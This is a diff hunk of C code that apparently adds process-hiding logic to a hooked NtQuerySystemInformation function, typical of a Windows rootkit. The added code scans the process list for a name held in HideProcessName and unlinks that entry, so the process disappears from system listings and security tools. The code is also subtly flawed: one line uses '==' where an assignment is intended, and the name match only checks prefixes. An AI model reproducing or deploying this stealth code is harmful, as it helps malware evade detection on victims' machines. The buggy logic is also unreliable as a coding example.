@@ -81,12 +81,36 @@ NTSTATUS NTAPI NewNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInform
     if (SystemInformationClass == 5)
     {
         PSYSTEM_PROCESS_INFORMATION pCur = SystemInformation;
-        PSYSTEM_PROCESS_INFORMATION pPrev = NULL;
+        PSYSTEM_PROCESS_INFORMATION pPrev = pCur;
         pCur = (ULONGLONG)pCur + pCur->NextEntryOffset;
 
         while (TRUE)
         {
-            
+            wchar_t s1, s2;
+            BOOL ret = TRUE;
+
+            for (int i = 0; (*(HideProcessName + i) != NULL) && (*(pCur->ImageName.Buffer + i) != NULL); i++)
+            {
+                s1 = Upper(*(HideProcessName + i));
+                s2 = Upper(*(pCur->ImageName.Buffer + i));
+                ret = (s1 == s2) ? TRUE : FALSE;
+                if (ret == FALSE)
+                    break;
+            }
+
+            if (ret)
+                break;
+
+            if (pCur->NextEntryOffset == 0)
+                return ntstatus;
+            pPrev = pCur;
+            pCur = (ULONGLONG)pCur + pCur->NextEntryOffset;
         }
+
+        if (pCur->NextEntryOffset == 0)
+            pPrev->NextEntryOffset == 0;
+        else
+            pPrev->NextEntryOffset += pCur->NextEntryOffset;
+        return ntstatus;
     }
 }
